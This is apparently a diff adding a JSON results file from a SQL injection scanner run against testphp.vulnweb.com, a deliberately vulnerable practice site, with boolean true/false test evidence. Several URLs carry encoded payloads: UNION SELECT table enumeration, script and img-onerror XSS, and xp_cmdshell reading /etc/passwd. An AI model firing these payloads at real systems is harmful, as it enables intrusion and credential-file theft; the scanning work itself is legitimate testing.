@@ -1,1 +1,210 @@
-[]
+[
+  {
+    "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23",
+    "parameter": "id",
+    "injection": "boolean",
+    "details": {
+      "type": "boolean",
+      "evidence": [
+        {
+          "payload_true": " AND 1=1",
+          "payload_false": " AND 1=2",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        },
+        {
+          "payload_true": " AND 1=1--",
+          "payload_false": " AND 1=2--",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        }
+      ],
+      "confidence": "HIGH"
+    }
+  },
+  {
+    "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23",
+    "parameter": "id",
+    "injection": "boolean",
+    "details": {
+      "type": "boolean",
+      "evidence": [
+        {
+          "payload_true": " AND 1=1",
+          "payload_false": " AND 1=2",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        },
+        {
+          "payload_true": " AND 1=1--",
+          "payload_false": " AND 1=2--",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        }
+      ],
+      "confidence": "HIGH"
+    }
+  },
+  {
+    "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23",
+    "parameter": "id",
+    "injection": "boolean",
+    "details": {
+      "type": "boolean",
+      "evidence": [
+        {
+          "payload_true": " AND 1=1",
+          "payload_false": " AND 1=2",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        },
+        {
+          "payload_true": " AND 1=1--",
+          "payload_false": " AND 1=2--",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        }
+      ],
+      "confidence": "HIGH"
+    }
+  },
+  {
+    "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "parameter": "id",
+    "injection": "boolean",
+    "details": {
+      "type": "boolean",
+      "evidence": [
+        {
+          "payload_true": "\" OR 1=1--",
+          "payload_false": "\" OR 1=0--",
+          "len_true": 319,
+          "len_false": 47,
+          "sim": 0.2568306010928962,
+          "status_equal": true
+        }
+      ],
+      "confidence": "MEDIUM"
+    }
+  },
+  {
+    "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23",
+    "parameter": "id",
+    "injection": "boolean",
+    "details": {
+      "type": "boolean",
+      "evidence": [
+        {
+          "payload_true": " AND 1=1",
+          "payload_false": " AND 1=2",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        },
+        {
+          "payload_true": " AND 1=1--",
+          "payload_false": " AND 1=2--",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        }
+      ],
+      "confidence": "HIGH"
+    }
+  },
+  {
+    "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23",
+    "parameter": "id",
+    "injection": "boolean",
+    "details": {
+      "type": "boolean",
+      "evidence": [
+        {
+          "payload_true": " AND 1=1",
+          "payload_false": " AND 1=2",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        },
+        {
+          "payload_true": " AND 1=1--",
+          "payload_false": " AND 1=2--",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        }
+      ],
+      "confidence": "HIGH"
+    }
+  },
+  {
+    "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23",
+    "parameter": "id",
+    "injection": "boolean",
+    "details": {
+      "type": "boolean",
+      "evidence": [
+        {
+          "payload_true": " AND 1=1",
+          "payload_false": " AND 1=2",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        },
+        {
+          "payload_true": " AND 1=1--",
+          "payload_false": " AND 1=2--",
+          "len_true": 1343,
+          "len_false": 23,
+          "sim": 0.03367496339677892,
+          "status_equal": true
+        }
+      ],
+      "confidence": "HIGH"
+    }
+  },
+  {
+    "url": "http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1",
+    "parameter": "id",
+    "injection": "boolean",
+    "details": {
+      "type": "boolean",
+      "evidence": [
+        {
+          "payload_true": " AND 1=1",
+          "payload_false": " AND 1=2",
+          "len_true": 323,
+          "len_false": 21,
+          "sim": 0.12209302325581395,
+          "status_equal": true
+        },
+        {
+          "payload_true": " AND 1=1--",
+          "payload_false": " AND 1=2--",
+          "len_true": 323,
+          "len_false": 21,
+          "sim": 0.12209302325581395,
+          "status_equal": true
+        }
+      ],
+      "confidence": "HIGH"
+    }
+  }
+]
